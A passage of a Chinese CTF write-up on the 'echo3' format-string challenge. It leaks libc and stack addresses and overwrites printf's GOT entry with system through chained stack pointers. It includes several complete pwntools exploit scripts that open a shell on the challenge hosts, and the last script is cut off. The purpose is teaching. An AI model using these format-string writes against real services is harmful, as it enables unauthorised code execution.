title="写在前面"></a>写在前面</h3><p><strong>在开始之前，有一点需要了解</strong>:在打本地的时候，程序默认加载的是本地默认libc，但是打远程的时候，程序则加载远程默认libc。这道题目原题作者给了<code>libc-2.23.so.i386</code>这个libc和我们正常的<code>libc-2.23.so.i386</code>不太一样。但是<code>使用不同的libc运行时，栈结构有差异，而我们找跳板正是利用了栈结构的一些特性，所以在本地调试的时候就需要通过指定libc，产生与远程相同的栈结构</code>。</p><h3 id="遇到的困难-未解决-3月19号已解决。"><a href="#遇到的困难-未解决-3月19号已解决。" class="headerlink" title="遇到的困难 (未解决)//3月19号已解决。"></a>遇到的困难 (未解决)//3月19号已解决。</h3><p><code>非常不幸</code>，尽管我已经下载下来了作者提供的<code>libc-2.23.so.i386</code>，但是我依旧没办法让程序优先加载这个libc，试了许多方法，包括<code>设置LD_PRELOAD</code>、<code>process(&#39;./echo3&#39;,env = {&quot;LD_PRELOAD&quot;: &quot;./libc-2.23.so.i386&quot;})</code>、<code>软链接</code>、<code>(这么做之前一定要备份原有的libc)删掉/lib/i386-linux-gnu/libc-2.23.so和libc.so.6，然后用作者给的libc替换libc-2.23.so，然后再用软链接搞出来libc.so.6</code></p><p>这些方法都会导致各种各样的报错，比如<code>段错误</code>、不能加载<code>libc-2.23.so.i386</code>之类的。初步推测是这个<code>libc-2.23.so.i386</code>有点问题？</p><p>如果能在本地通过加载作者给的libc来调试，就能得到准确的偏移，远程应该也就能打得通了。</p><p><strong>但是重在学习fmt_bss类题目的打法，拿不拿得到flag就不是那么重要了，本文将写本地打法</strong></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序本身没有<code>system</code>函数，所以需要先泄露libcbase，然后得到system函数。</p><p>同时也需要泄露栈地址，以便我们找跳板。</p><p>通过跳板修改<code>printf_got</code>为<code>system</code></p><p>传入<code>/bin/sh</code>来getshell</p><h3 id="泄露栈地址和libcbase"><a href="#泄露栈地址和libcbase" class="headerlink" title="泄露栈地址和libcbase"></a>泄露栈地址和libcbase</h3><p>由于程序存在<code>alloca</code>并且<code>sub esp, eax</code>，会导致栈地址的变动。不过有一点非常有意思。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200318190827725.png" alt></p><p>写个程序运算一下，可以发现<code>alloca</code>的参数只有如下可能</p><p><code>[&#39;0x10&#39;, &#39;0x20&#39;, &#39;0x30&#39;, &#39;0x40&#39;, &#39;0x50&#39;, &#39;0x1010&#39;, &#39;0x1020&#39;, &#39;0x1030&#39;, &#39;0x1040&#39;, &#39;0x1050&#39;, &#39;0x2010&#39;, &#39;0x2020&#39;, &#39;0x2030&#39;, &#39;0x2040&#39;, &#39;0x2050&#39;, &#39;0x3010&#39;, &#39;0x3020&#39;, &#39;0x3030&#39;, &#39;0x3040&#39;, &#39;0x3050&#39;]</code></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="number">0x20</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1010</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x1050</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x1030</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x2010</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x30</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x50</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x40</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3050</span>	<span class="number">2047</span>	<span class="number">0.0165293927649</span></span><br><span class="line">&gt;<span class="number">0x3010</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2020</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1040</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1020</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3020</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x10</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2040</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3030</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3040</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x2050</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2030</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>从左到右依次是 16进制表示、10进制表示、出现概率。</p><p>我们可以通过多次尝试或者直接在exp里加入控制语句来让这个栈的减少值固定下来。</p><p>在此之前，先来调试一下，看看此时栈有什么特征，以便在exp加入控制语句。</p><p>gdb调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">08048774                 sub     esp, eax</span><br><span class="line">...</span><br><span class="line">08048646                 call    _printf</span><br></pre></td></tr></table></figure><p>在这两处位置下断，执行到第一个断点的时候<code>set $eax = 0x20</code>，使得esp=0x20,当然也可以选取别的值。</p><p>接着执行，到<code>call printf</code>的时候<code>stack 100</code> 查看栈情况。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318191540.png" alt></p><p>能够看到<code>__libc_start_main + 247</code>,此时其偏移为43 可通过<code>%43$p</code>来打印出来。可以发现其特征为后三位为<code>637</code>，选取后三位是因为这三位是不变的，如果虚拟机开了ASLR，除了后三位以外，其他位置都有可能变。</p><p>通过这个能泄露出libcbase，但还需要泄露出栈地址，这里选择偏移为30的这一处</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192148.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29736</span>)</span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)<span class="comment">#for process()</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')#for remote()</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><h3 id="找跳板"><a href="#找跳板" class="headerlink" title="找跳板"></a>找跳板</h3><p>原理利用了之前讲到的A-&gt;B-&gt;C</p><p>由于刚才已经找到了位于30偏移的栈地址，其地址里存的是位于87偏移的地址，87偏移的地址里面存的是一些其他东西。</p><p>这道题比较巧，栈里面存在<code>_GLOBAL_OFFSET_TABLE_</code>可以覆盖其低位字节来让其指向<code>printf_got</code>。图中这两处偏移分别为20和21</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192806.png" alt></p><p>所以跳板流程可以如下表示，为了看起来更舒服，这里用偏移来代替地址。。</p><p>这里<code>_GLOBAL_OFFSET_TABLE_</code>表示的是存放<code>_GLOBAL_OFFSET_TABLE_</code>的栈地址。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----第一步，利用30-------</span><br><span class="line">修改前</span><br><span class="line">30-&gt;87-&gt;其他</span><br><span class="line">修改后</span><br><span class="line">30-&gt;87-&gt;21</span><br><span class="line">-----第二步，利用87-------</span><br><span class="line">修改前</span><br><span class="line">87-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_</span><br><span class="line">修改后</span><br><span class="line">87-&gt;21-&gt;printf_got</span><br><span class="line">----第三步，利用21-------</span><br><span class="line">修改前</span><br><span class="line">21-&gt;printf_got</span><br><span class="line">修改后</span><br><span class="line">21-&gt;printf_got-&gt;system</span><br></pre></td></tr></table></figure><p>可以看出，每一步，对应<code>A-&gt;B-&gt;C</code>中A和B位置的都是指针。</p><p><strong>然而，这样由于printf反馈的数据太多了，大概会运行好几分钟。。。而如果打远程的话，恐怕没这么多时间，而且考虑网络因素，这样就算payload正确也很难打通吧</strong></p><p>因此有了改进的payload，每次修改2字节，这样会大大降低数据量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">----第一步----借助30和31</span><br><span class="line">修改前</span><br><span class="line">30-&gt;87-&gt;其他</span><br><span class="line">31-&gt;85-&gt;其他</span><br><span class="line">修改后</span><br><span class="line">30-&gt;87-&gt;20</span><br><span class="line">31-&gt;85-&gt;21</span><br><span class="line">----第二步----借助85和87</span><br><span class="line">修改前</span><br><span class="line">85-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_</span><br><span class="line">87-&gt;20-&gt;_GLOBAL_OFFSET_TABLE_+4</span><br><span class="line">修改后</span><br><span class="line">87-&gt;20-&gt;printf_got</span><br><span class="line">85-&gt;21-&gt;printf_got + 2</span><br><span class="line">----第三步----借助20和21</span><br><span class="line">修改前</span><br><span class="line">20-&gt;printf_got</span><br><span class="line">21-&gt;printf_got + 2</span><br><span class="line">修改后</span><br><span class="line">20-&gt;printf_got-&gt;system后两字节</span><br><span class="line">21-&gt;printf_got + 2-&gt;system前两字节</span><br><span class="line"></span><br><span class="line">//关于这里字节的前后,更博的时候我自己都绕晕了...记录一下</span><br><span class="line">[+] printf_got = 0x804a014</span><br><span class="line">[+] system = 0xf7e3fda0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/4x 0x804a014</span><br><span class="line">0x804a014:	0xa0	0xfd	0xe3	0xf7</span><br><span class="line">pwndbg&gt; x/wx 0x804a014</span><br><span class="line">0x804a014:	0xf7e3fda0</span><br><span class="line">//应该能看明白吧</span><br></pre></td></tr></table></figure><p>第二步挺巧妙的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">0050</span>│  <span class="number">0xffffcfd0</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│  <span class="number">0xffffcfd4</span> —▸ <span class="number">0x804a060</span> (magic) ◂— <span class="number">0xadb5e79a</span></span><br></pre></td></tr></table></figure><p>可以看到0xffffcfd0和0xffffcfd0+4所存的地址都是<code>0x804axxx</code>而正好<code>_GLOBAL_OFFSET_TABLE_</code>为<code>0x804a000</code>，<code>不同函数got值前两字节是不变的，改变的只是后两字节</code>，因此我们才有了每次修改两字节的方法。</p><p><strong>这里还有一个细节，我们来看system。</strong></p><p><code>[+] system = 0xf7e3fda0</code></p><p>可以看出 system的前两字节<code>0xf7e3</code>要小于后两字节<code>0xfda0</code>，再想想我们fmt_payload的构造方法，就能得知要先修改值小的前两字节，然后再修改后两字节。</p><hr><p>所以得到代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>,<span class="number">21</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system &amp; <span class="number">0xffff</span>) - ((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>),<span class="number">20</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',29736)</span></span><br><span class="line">    c = process(<span class="string">"./echo3"</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>,<span class="number">21</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system &amp; <span class="number">0xffff</span>) - ((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>),<span class="number">20</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="3月19日凌晨针对echo3的新更新"><a href="#3月19日凌晨针对echo3的新更新" class="headerlink" title="3月19日凌晨针对echo3的新更新"></a>3月19日凌晨针对echo3的新更新</h1><p>请教了一下大佬，关于之前为什么我没法指定题目给的libc来运行echo3，原来我姿势不对。</p><p>这里贴一下陈大佬的看雪文章<a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">陈老板的看雪文章</a></p><p>里面介绍了如何利用<code>patchelf</code>这个工具来更换程序libc。</p><p>主要命令就是两条，以这道题目的<code>echo3</code>和<code>libc-2.23.so.i386</code>为例来说，我们还需要一个<code>ld-2.23.so</code></p><p><strong>！！！注意这个ld-2.23.so不能直接在/lib/i386-linux-gnu/ld-2.23.so取，这个会一直报段错误。。。被这个困扰了好长时间！多亏陈大佬提醒要去glibc all in one 里下载</strong></p><p>然后我们通过patchelf来更换程序的libc</p><p><code>patchelf --set-interpreter ./ld-2.23.so ./echo3</code></p><p><code>patchelf --replace-needed libc.so.6 ./libc-2.23.so.i386 ./echo3</code></p><p>第一条指令是用来修改ld的，第二条指令是用来修改libc的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319013451.png" alt></p><p>改完以后是这样的。</p><p><strong>本地又调了调，调好本地能打通了，但这在BUU上依旧没法打通，不过在hackme.inndy.tw上面打得通</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319020512.png" alt></p><p><strong>只能说BUU上面的libc有些。。奇葩吧,拿不拿得到flag其实也就那样了,关键是通过这道题目学了好多东西,这要比拿再多的flag都要有意义。</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_77941145_20191125_132523.png" alt></p><p>和之前的exp相比，就改了一下改printf_got为system的顺序，因为换了libc以后，system的前两个字节要大于后两个字节。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7720</span>)    </span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',27252)</span></span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so.i386'</span>)</span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) 